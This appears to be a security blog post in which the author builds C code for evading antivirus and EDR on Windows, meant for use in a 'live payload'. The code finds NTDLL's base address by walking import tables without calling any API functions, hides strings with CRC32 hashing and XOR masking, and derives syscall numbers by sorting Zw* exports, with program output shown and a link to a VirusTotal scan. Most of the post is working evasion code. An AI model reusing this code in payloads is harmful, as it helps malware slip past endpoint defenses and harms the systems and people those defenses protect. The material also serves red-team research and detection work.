##Silent NTDLL Enumeration

A popular technique for AV/EDR evasion is manually performing [syscalls](https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls). There are multiple projects that have been developed to that end, but most of them suffer from one downside or another; having to manually generate SSNs (System Service Numbers) for the target environment prior to deployment, setting breakpoints, (ab)using [Vectored Exception Handling](https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling), reading NTDLL from disk, calling functions that have already be hooked, etc. Relying on code written by others is a personal pet peeve of mine, so I decided to come up with my own solution and eliminate all of the aforementioned issues.

The very first thing I realized was that if I wanted to avoid as much scrutiny as possible, I'd need to locate NTDLL without calling anything suspicious from the Windows [CRT](https://learn.microsoft.com/en-us/cpp/c-runtime-library/c-run-time-library-reference?view=msvc-170) or [API](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list). My thought process was that by the time my code got executed, AV/EDR would have long since hooked everything and any external function I called could potentially be monitored; something I wanted to avoid entirely. As an example of that, calling the CRT function [fopen](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/fopen-wfopen?view=msvc-170) on "ntdll.dll" will ultimately result in a call to [NtCreateFile](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile) and, presumably, a detection. Many CRT functions *don't* have this issue, but I'm paranoid.

That left me with almost nothing. I could call my own functions and dereference memory. That was it. I knew that NTDLL was somewhere in memory, but how was I supposed to find it without calling any functions? Enter the [__ImageBase](https://devblogs.microsoft.com/oldnewthing/20041025-00/?p=37483) pseudovariable generated by the [MSVC](https://visualstudio.microsoft.com/) linker. This pseudovariable will always point to the current module's [IMAGE_DOS_HEADER](https://learn.microsoft.com/en-us/archive/msdn-magazine/2002/february/inside-windows-win32-portable-executable-file-format-in-detail) structure, which is also equivalent to the module's base address.

Note: All code presented herein will be using `printf` statements and calls to [GetModuelHandleA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) for debugging/demonstration purposes. These would not be present in a live payload. Additionally, I've implemented some *very* basic XOR masking, but absolutely nothing else in the way of obfuscation.

```C
BYTE* image = (BYTE*)(& __ImageBase);
IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)(image);

printf("Magic value is: %04X\n", dos_header->e_magic);
printf("Base address is: %016llX\n", (UINT64)image);
printf("Base address is: %016llX\n", (UINT64)GetModuleHandleA(NULL));
```

The above code will output the following:

```
Magic value is: 5A4D
Base address is: 00007FF74D360000
Base address is: 00007FF74D360000
```

Now that I had a pointer to the DOS header, I could start searching for NTDLL. Normally an executable won't directly import anything from NTDLL, however, but from KERNEL32 which then itself imports from NTDLL. So to find NTDLL I first had to find KERNEL32. Before jumping into that, I needed a way of doing string comparisons without calling something like [_stricmp](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/stricmp-wcsicmp-mbsicmp-stricmp-l-wcsicmp-l-mbsicmp-l?view=msvc-170). I wasn't worried about it being hooked, but using it would produce very obvious plaintext strings in the resulting binary and, again, the whole point here was to try to be stealthy. Enter [CRCs](https://en.wikipedia.org/wiki/Cyclic_redundancy_check) (cyclic redundancy checks):

```C
DWORD crc32(BYTE* input, size_t bytes)
{
    DWORD crc32 = 0xFFFFFFFF;

    for (size_t i = 0; i < bytes; i++)
    {
        // Convert each character to lowercase prior to XORing.
        crc32 ^= (input[i] >= 0x41 && input[i] <= 0x5A) ? input[i] + 32 : input[i];

        for (size_t j = 0; j < 8; j++)
            crc32 = (crc32 >> 1) ^ ((crc32 & 1) ? 0xEDB88320 : 0);
    }

    return(crc32 ^ 0xFFFFFFFF);
}
```

Using that, I was able to precompute the checksums for "kernel32.dll" and "ntdll.dll"; `6AE69F02` and `84C05E40`, respectively. It was time to start hunting.

```C
IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)(image + dos_header->e_lfanew);
UINT64 address = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
IMAGE_IMPORT_DESCRIPTOR* imports = (IMAGE_IMPORT_DESCRIPTOR*)(image + address);

for (; imports->Characteristics != 0; imports++)
{
    BYTE* name = image + imports->Name;
    size_t len = 0;

    // No calling strlen()!
    for (;; len++)
    {
        if (name[len] == 0)
            break;
    }

    // Find "kernel32.dll".
    if (crc32(name, len) == 0x6AE69F02)
        break;
}

IMAGE_THUNK_DATA* import_names = (IMAGE_THUNK_DATA*)(image + imports->OriginalFirstThunk);
IMAGE_THUNK_DATA* import_addrs = (IMAGE_THUNK_DATA*)(image + imports->FirstThunk);

// The first two bytes of an import name are its ordinal value.
printf("KERNEL32 first import name: %s\n", image + import_names->u1.AddressOfData + 2);
printf("KERNEL32 first import addr: %016llX\n", import_addrs->u1.AddressOfData);
```

The above code will output the following:

```
KERNEL32 first import name: GetCurrentThreadId
KERNEL32 first import addr: 00007FFE395A5890
```

Now I had another problem: How could I take the address of an import and find the base address of the image in which it resides without calling any functions? If you've spent any amount of time debugging on 64-bit Windows, you'll no doubt have noticed that modules are usually loaded at addresses ending in `0000`, while their exports *mostly* reside within that four byte range (or very closely adjacent to it). This is the key. The lower four bytes of an imported function's address can be nulled out. Starting there, it's then possible to step backwards in memory searching for the module's headers.

Building off of the previous code, I now had this:

```C
image = (BYTE*)(import_addrs->u1.AddressOfData & ~0xFFFF);

do {
    dos_header = (IMAGE_DOS_HEADER*)image;

    // Check for XOR-masked IMAGE_DOS_SIGNATURE.
    if ((dos_header->e_magic ^ 0xFFFF) == 0xA5B2)
    {
        nt_headers = (IMAGE_NT_HEADERS*)(image + dos_header->e_lfanew);

        // Check for XOR-masked IMAGE_NT_SIGNATURE.
        if ((nt_headers->Signature ^ 0xFFFF) == 0xBAAF)
            break;
    }

    image -= 0x10000;

} while (image > 0);

printf("KERNEL32 base address: %016llX\n", (UINT64)image);
printf("KERNEL32 base address: %016llX\n", (UINT64)GetModuleHandleA("kernel32.dll"));
```

The above code will output the following:

```
KERNEL32 base address: 00007FFE39590000
KERNEL32 base address: 00007FFE39590000
```

The addresses were identical. My technique worked. Now I simply had to repeat the process by walking KERNEL32's import directory, this time looking for NTDLL and then once again stepping backwards through memory from its first import to its base address.

```C
address = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
imports = (IMAGE_IMPORT_DESCRIPTOR*)(image + address);

for (; imports->Characteristics != 0; imports++)
{
    BYTE* name = image + imports->Name;
    size_t len = 0;

    // No calling strlen()!
    for (;; len++)
    {
        if (name[len] == 0)
            break;
    }

    // Find "ntdll.dll".
    if (crc32(name, len) == 0x84C05E40)
        break;
}

import_names = (IMAGE_THUNK_DATA*)(image + imports->OriginalFirstThunk);
import_addrs = (IMAGE_THUNK_DATA*)(image + imports->FirstThunk);

// The first two bytes of an import name are its ordinal value.
printf("NTDLL first import name: %s\n", image + import_names->u1.AddressOfData + 2);
printf("NTDLL first import addr: %016llX\n", import_addrs->u1.AddressOfData);

image = (BYTE*)(import_addrs->u1.AddressOfData & ~0xFFFF);

do {
    dos_header = (IMAGE_DOS_HEADER*)image;

    // Check for XOR-masked IMAGE_DOS_SIGNATURE.
    if ((dos_header->e_magic ^ 0xFFFF) == 0xA5B2)
    {
        nt_headers = (IMAGE_NT_HEADERS*)(image + dos_header->e_lfanew);

        // Check for XOR-masked IMAGE_NT_SIGNATURE.
        if ((nt_headers->Signature ^ 0xFFFF) == 0xBAAF)
            break;
    }

    image -= 0x10000;

} while (image > 0);

printf("NTDLL base address: %016llX\n", (UINT64)image);
printf("NTDLL base address: %016llX\n", (UINT64)GetModuleHandleA("ntdll.dll"));
```

The above code will output the following:

```
NTDLL first import name: _wcslwr
NTDLL first import addr: 00007FFE39B7E3A0
NTDLL base address: 00007FFE39AF0000
NTDLL base address: 00007FFE39AF0000
```

Success. I had recovered NTDLL's base address. I could now set about enumerating NTDLL to calculate syscall SSNs and search for various gadgets that would allow me to invoke the `syscall` instruction, enumerate the [PEB](https://en.wikipedia.org/wiki/Process_Environment_Block) (Process Environment Block), etc. All without calling any external functions.

My preferred method for enumerating syscall SSNs is to simply sort all NTDLL `Zw*` function exports by their address in memory. That's it. It's dead simple and can be done at runtime on any version of Windows. It doesn't matter if there's AV/EDR. It doesn't matter if the syscall wrappers are hooked. It doesn't even matter if the entire wrapper has somehow been clobbered and the hardcoded SSN can't be extracted anymore (ala [HellsGate](https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf)). It just works.

First, enumerating all of the NTDLL `Zw*` exports and recording their addresses, names and checksums.

At the top of the file:

```C
struct syscall {
    BYTE* addr;
    BYTE name[MAX_PATH];
    DWORD crc32;
    DWORD ssn;
    BOOL sorted;
};

static struct syscall syscalls[512] = { 0 };
```

And the accompanying code:

```C
DWORD index = 0;

address = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)(image + address);

UINT32* export_funcs = (UINT32*)(image + exports->AddressOfFunctions);
UINT32* export_names = (UINT32*)(image + exports->AddressOfNames);
UINT16* export_nords = (UINT16*)(image + exports->AddressOfNameOrdinals);

for (DWORD i = 0; i < exports->NumberOfNames; i++)
{
    BYTE* func_name = (BYTE*)(image + export_names[i]);
    BYTE* func_addr = (BYTE*)(image + export_funcs[export_nords[i]]);

    // Look for exports starting with "Zw" (XOR-masked).
    if ((*((UINT16*)func_name) ^ 0xFFFF) != 0x88A5)
        continue;

    size_t len = 0;

    // No calling strlen() or memcpy()!
    for (;; len++)
    {
        if (func_name[len] == 0)
            break;

        syscalls[index].name[len] = func_name[len];
    }

    // Convert "Zw" to "Nt" for checksum/lookup purposes.
    syscalls[index].name[0] ^= 0x14;
    syscalls[index].name[1] ^= 0x03;

    syscalls[index].addr = func_addr;
    syscalls[index].crc32 = crc32(syscalls[index].name, len);

    index++;
}
```

Finally, my (probably horribly inefficient) "sorting" algorithm. It doesn't actually *sort* the array, just assigns SSNs based on memory addresses.

```C
DWORD ssn = 0;

for (;;)
{
    BOOL found = FALSE;
    BYTE* lowest_addr = NULL;
    DWORD lowest_index = 0;

    for (DWORD i = 0; i < index; i++)
    {
        if (syscalls[i].sorted == TRUE)
            continue;

        // Find the "unsorted" entry with the lowest address.
        if (lowest_addr == NULL || syscalls[i].addr < lowest_addr)
        {
            found = TRUE;
            lowest_addr = syscalls[i].addr;
            lowest_index = i;
        }
    }

    // No more entries.
    if (found == FALSE)
        break;
    
    syscalls[lowest_index].ssn = ssn++;
    syscalls[lowest_index].sorted = TRUE;

    printf("SYSCALL %s SSN: %04X\n", syscalls[lowest_index].name, syscalls[lowest_index].ssn);
}
```

The above code will output the following (truncated for obvious reasons):

```
SYSCALL NtAccessCheck SSN: 0000
SYSCALL NtWorkerFactoryWorkerReady SSN: 0001
SYSCALL NtAcceptConnectPort SSN: 0002
SYSCALL NtMapUserPhysicalPagesScatter SSN: 0003
SYSCALL NtWaitForSingleObject SSN: 0004
SYSCALL NtCallbackReturn SSN: 0005
...
```

Load up your local copy of NTDLL in IDA and inspect one of the syscall wrappers. You'll see `EAX` being set to the value from the output above just before the `syscall` instruction. We've achieved a perfect 1:1 mapping of SSNs without calling any external functions or reading NTDLL off disk. Beautiful.

```nasm
.text:000000018009D580 ; =============== S U B R O U T I N E =======================================
.text:000000018009D580
.text:000000018009D580
.text:000000018009D580                 public ZwCallbackReturn
.text:000000018009D580 ZwCallbackReturn proc near              ; CODE XREF: KiUserCallbackDispatcherHandler+77↓p
.text:000000018009D580                                         ; KiUserCallbackDispatcher+2B↓p
.text:000000018009D580                                         ; DATA XREF: ...
.text:000000018009D580                 mov     r10, rcx        ; NtCallbackReturn
.text:000000018009D583                 mov     eax, 5
.text:000000018009D588                 test    byte ptr ds:7FFE0308h, 1
.text:000000018009D590                 jnz     short loc_18009D595
.text:000000018009D592                 syscall                 ; Low latency system call
.text:000000018009D594                 retn
.text:000000018009D595 ; ---------------------------------------------------------------------------
.text:000000018009D595
.text:000000018009D595 loc_18009D595:                          ; CODE XREF: ZwCallbackReturn+10↑j
.text:000000018009D595                 int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
.text:000000018009D595                                         ; DS:SI -> counted CR-terminated command string
.text:000000018009D597                 retn
.text:000000018009D597 ZwCallbackReturn endp
```

And just for good measure, [VirusTotal](https://www.virustotal.com/gui/file/78a159cef194c71ecc53fd6712cac449424cb4831d15b741d8ad2bb05f335522) results:

![VirusTotal](img/2025-01-29/virustotal.png)

Anyway, that's all for now. Thanks for reading. All of the code presented here is available on my [Github](https://github.com/st0rms3c/silent_ntdll).
